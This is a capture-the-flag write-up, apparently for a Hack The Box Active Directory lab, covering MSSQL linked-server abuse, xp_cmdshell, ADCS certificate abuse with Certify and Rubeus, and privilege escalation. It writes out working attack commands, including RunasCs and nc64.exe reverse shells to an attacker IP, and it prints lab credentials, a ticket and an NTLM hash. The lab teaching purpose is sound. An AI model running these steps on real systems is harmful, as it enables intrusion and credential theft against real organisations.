
# Summary
#mssql #Certificate #Delegation

---

`john.w` : `RFulUtONCOL!`
10.129.77.28

We will start with nmap:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-05 15:47:29Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+
2179/tcp open  vmrdp?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
```

Trying to use `nxc`, found that `NTLM` authentication is disabled. So, if we want to use anything we should use `kerberose`.

Try to get inside mssql
```
mssqlclient.py  'darkzero.htb/john.w:RFulUtONCOL!@10.129.77.28' -windows-auth
SQL (darkzero\john.w  guest@master)>
```
We tried to get shell but we can't execute commands.

We found we have can login as another user in another server in another domain "trust" which is `DC02.darkzero.ext`:
```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc 
```

Use this link to login in the other server, and we found we can do `xp_cmdshell`:
```
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -e POWERSHELL_REVERSE_SHELL_BASE(64)
```

We have `svc_sql` access, which is service account. Usually those accounts runs with privileged access, but when i did `whoami /priv` i found that `UAC` is enabled:
```
PS C:\Users\svc_sql> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## UAC bypass
We need to find a way to bypass the UAC, we can try to use `RunasCs.exe`. But this need the password or the hash of the user.
We can manage getting the password or the hash by requesting normal certificate form the `ADCS`, while requesting it we can view the password hash.
```
.\Certify.exe request /ca:'DC02\darkzero-ext-DC02-CA' /template:User /outfile:"C:\Users\svc_sql\cert.pem"
[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

I have transfered it to my linux to convert it to ready to use certificate:
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:                                                                   
Verifying - Enter Export Password: 
```

> [!attention] openssl
> It may ask you for password, leave it blank just press **Enter**

I don't want to configure the TGT for the internal KDC so i transfered the certificate back to the server and used `rubues.exe`:
```
PS C:\Users\svc_sql> .\Rubeus.exe asktgt /user:svc_sql /certificate:cert.pfx /getcredentials /nowrap                                
   ______        _                                                                                                                                                                                 
  (_____ \      | |                             
   _____) )_   _| |__  _____ _   _  ___         
  |  __  /| | | |  _ \| ___ | | | |/___)        
  | |  \ \| |_| | |_) ) ____| |_| |___ |        
  |_|   |_|____/|____/|_____)____/(___/         

  v2.0.2                                        

[*] Action: Ask TGT                             

[*] Using PKINIT with etype rc4_hmac and subject: CN=svc_sql, CN=Users, DC=darkzero, DC=ext 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'darkzero.ext\svc_sql'                              
[*] Using domain controller: ::1:88             
[+] TGT request successful!                     
[*] base64(ticket.kirbi):                       

      doIGADCCBfygAwIBBaEDAgEWooIFFjCCBRJhggUOMIIFCqADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+g           
      AwIBAqEYMBYbBmtyYnRndBsMZGFya3plcm8uZXh0o4IEzjCCBMqgAwIBEqEDAgECooIEvASCBLhCdJkW           
      shyNiLX7Ih9xafwkrloFMo3qlK7TiLQOA0i4hfhe1A6sWdCmd1UC4y7++VCOvFC79p6PlW9bO5LpDJ9C           
      dsGcktRAtgRA/LGAdaQVmw/XutMfcbAqC3h2DorqspSaL/dtxzD23cySRNvrv5wHxaipDo3DbIJ+t6y3           
      0NY/hvcCn2sdPUKX8eMBMSCtdY/FyL+Ix3EBE+pV29ZlfJzJAdx9px0QNRy/7X3YSyNh3B6yQQiNNCfz           
      27/NMYSeMskYn0LTrMFMcS2B6VZLvDuj07QMqPrv0iuPIk0ufypVSxYqHwntWKgpbjofpQHquS9kw8mG           
      a8FWFteooQPKTG6yUfJRQm85SFaCZ8Vq1878XNYmwhWDu62NhdOdEfzg5Bh23YpqTYO1v9XryOAbwDvq           
      nPubn39BjH2Al5tFTHHEBdhckdpoNGoBlSTVwjpyOGm0NZTPNkQKTD/drLO4Dfw7ZCL8t5KDRRMHofJl           
      48TAYu3XDugZBppkJ2W+RhU9BmDGo4cn5VToahT9Csn+cNGoggdfvh/lhYAeJOPqtNoyEF9nljU8KUFm           
      7tA3htulbuC+0GVe1ldzetaJw98N9iCB8PZKJgBCTv9B90TJTvbCPT/lykiEhaVEGMbgmaANuHs1xyAc           
      ZaQIA6T3/rixDvbrS0eVEygClDiMu8w0Knkx5YjV1rkVWxBF0YVqNuwti4XW1EDBqEYXLOkXe/zow7qj           
      OqeU5yFVRbXR7pyAeZmV6m1zLJnasNt0acqXZXAdhwe3jeeUYQuaqI8HUh6OGMlWdpkNdK6UZsIYI8af           
      bXJY+CQ1qW1NFUBT1l93ADHWmPABHsioWOJRljODbArAv4pQy9nVHEpsSVIf4arD4ZVSvbaBkb1MrnQb           
      7fy9Vv8UJd2bWGyZBuxXyMerwBiVSuUtuQPueDWZJetj7hJsaEhVVnvOnlq/bfaksJg8iy4ury4Evsbd           
      0DhJd2IC536VRgUE4Nh4EBper9B/YdK3j9ZeKTn9UWVxsa1UV33tz982zkmDtLC+2aK/qK0apQ35RJeS           
      hgtIK7fwak7GJAKNjbwq38p7uRzXEM1FxhNLhbmpMa3ru5hJBsd6JAmxMvFZ5UFTPZVsKAJ2jXlmM9nE           
      bVtCAWIq9y/6A9RvHHoVHo+F1MKORaln/NoWaQbNJpSyN9xABcu8fbRwTZGzkrbGWLq3HIDawAadLvNV           
      n4pkzLA2WKFim9WkfTKVK5vbp9SnX3dsUtuNoBlbcoY6uccZSSjN5IaRs5FuQt4eNTRuzN9utl4TmVfk           
      H0nSvO4qGZ6sMSeIoj1tbeR+Kvh4jdC/zOWXJjYalauP3V2SkRDC24FhJ2DtGp2SH0GaVvBhNAEuygoc           
      XE7S1TEZAvIidVfq61iAWkNmBeVtm4cvPFlJ5MI2HGXZVjz72eOmf+K5Lyttji/a2wufqDZrl0Jlg9pn           
      zd5kLHXNBkbjXhcO3mxOg5gRgjWD8/J78fzGSTbBufArn4LTpQD74sMJ++RFbecK+RHJXjpH6g1wuEB0           
      vb/s7MerAAf/aF0ETNtVDywmk2XS/ySy6MQtEW1/g8aNFckgs258R+2wCSrJ0s199+qAj/RhhPYLNsa6           
      tYWmWKOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEEK/HSaEM/3AAFU2k           
      s1RFFRihDhsMREFSS1pFUk8uRVhUohQwEqADAgEBoQswCRsHc3ZjX3NxbKMHAwUAQOEAAKURGA8yMDI1           
      MTAxMzIzNTEwNVqmERgPMjAyNTEwMTQwOTUxMDVapxEYDzIwMjUxMDIwMjM1MTA1WqgOGwxEQVJLWkVS           
      Ty5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGRhcmt6ZXJvLmV4dA==                                   

  ServiceName              :  krbtgt/darkzero.ext                                                
  ServiceRealm             :  DARKZERO.EXT      
  UserName                 :  svc_sql           
  UserRealm                :  DARKZERO.EXT      
  StartTime                :  10/13/2025 4:51:05 PM                                              
  EndTime                  :  10/14/2025 2:51:05 AM                                              
  RenewTill                :  10/20/2025 4:51:05 PM                                              
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac          
  Base64(key)              :  r8dJoQz/cAAVTaSzVEUVGA==
  ASREP (key)              :  0BC3CE804AFBFD50FF7877B03696C074  
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 816CCB849956B531DB139346751DB65F

```

That is the hash: `816CCB849956B531DB139346751DB65F`

After getting the hash, we will change the password so we can use `RunasCs.exe`.

> [!NOTE] RunasCs.exe
> RunasCs.exe needs the plain text of the password, it doesn't accept NTLM hash.

```
changepasswd.py svc_sql@172.16.20.2 -hashes 816CCB849956B531DB139346751DB65F -newpass 'P@ssw0rd1!' -dc-ip 172.16.20.2
```

After that we use `RunasCs.exe`:
```
.\RunasCs.exe svc_sql 'P@ssw0rd1!' powershell -l 5 -b -r 10.10.16.60:4442
```

Now looking at our privileges:
```
Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
SeMachineAccountPrivilege
```

Getting `SYSTEM` in `DC02.darkzero.ext` using metasploit 
```
C:\Users\svc_sql\nc64.exe 10.10.16.60 4444 -e cmd.exe
```